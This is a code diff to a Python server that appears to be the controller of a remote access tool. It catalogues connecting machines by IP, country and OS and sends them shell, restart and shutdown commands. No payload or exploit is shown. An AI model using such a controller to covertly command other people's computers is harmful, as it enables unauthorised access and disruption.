@@ -1,13 +1,17 @@
 import socket
 import threading
-from server_folder.tools import Menu
+from server_folder.tools import Menu  # Delete when GUI is added
 import server_folder.config as config
-import json
+from server_folder.Modules import shell as Shell, power as Power
 
 
 class Server:
     def __init__(self, ip, port):
-        """ Initiates the server """
+        """
+        Initiates the server
+        :param ip: ip address to host the server on
+        :param port: port to listen for connections on
+        """
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_socket.bind((ip, port))
         self.server_socket.listen()
@@ -20,23 +24,30 @@ class Server:
         self.server_socket.close()
 
     def send(self, sock, message):
-        """ Sends a message in small chunks to the server 
-            Parameters:
-                message (bytes\str): Message to send the server """
+        """
+        Sends a message in small chunks to the client
+        :param sock: Client socket object
+        :param message: Message to send to the server (bytes/str)
+        """
         message = message.encode() if type(message) != bytes else message
+        if len(message) % config.BUFFER_SIZE == 0:
+            message = message + '.'.encode()
         while message:
             sock.send(message[:config.BUFFER_SIZE])
             message = message[config.BUFFER_SIZE:]
 
     def receive(self, sock, as_bytes=False):
-        """ Recieve a message in small chunks from the server 
-            Parameters:
-                as_bytes (bool): If set to True, this function will return the data as bytes. Default=False """
+        """
+        Recieve a message in small chunks from the client
+        :param sock: Client socket object
+        :param as_bytes: If set to True, this function will return the data as bytes. Default=False
+        """
         chunk = sock.recv(config.BUFFER_SIZE)
         data = chunk
         while len(chunk) == config.BUFFER_SIZE:
             chunk = sock.recv(config.BUFFER_SIZE)
-            data += chunk
+            if chunk != '.'.encode():
+                data += chunk
         return data if as_bytes else data.decode()
 
 
@@ -50,7 +61,11 @@ def print_logo():
           'Made by: Asaf and Rohy\n\nEnter your command:')
 
 
-def client_connections():
+def client_connections(server):
+    """
+    Handles new connections and adds them to the client list.
+    :param server: Server socket object
+    """
     try:
         while True:
             (client_socket, addr) = server.server_socket.accept()
@@ -67,16 +82,19 @@ def client_connections():
             if not exist:
                 config.all_connections.append({'ip': client_data[0], 'data': {'countryCode': client_data[1], 'name': client_data[2], 'os': client_data[3], 'socket': client_socket}})
     except socket.error:
-        client_connections()
+        client_connections(server)
+
+
+def get_targets():
+    """Wip would be connected to the GUI"""
+    return [0]
 
 
 def main():
     print_logo()
-    global server
     server = Server('localhost', 8000)
-    menu = Menu(server)
-    threading.Thread(target=client_connections).start()  # Thread to accept new connections
-    # threading.Thread(target=idle_check).start() # Thread to check if the user is idle/if the machine is still connected.
+    menu = Menu(server)  # Delete after GUI
+    threading.Thread(target=client_connections, args=(server,)).start()  # Thread to accept new connections
     while True:
         user_input = input(config.custom_console).split()
         cmd = user_input[0] if len(user_input) > 0 else ''  # Get raw command
@@ -93,8 +111,13 @@ def main():
                 menu.quit()
             elif cmd == 'kill':
                 menu.kill()
+            # -------------------------
             elif cmd == 'shell':
-                menu.shell()
+                Shell.shell(server, get_targets())
+            elif cmd == 'restart':
+                Power.restart(server, get_targets())
+            elif cmd == 'shutdown':
+                Power.shutdown(server, get_targets())
             elif cmd == '':
                 print('\n')
             else:
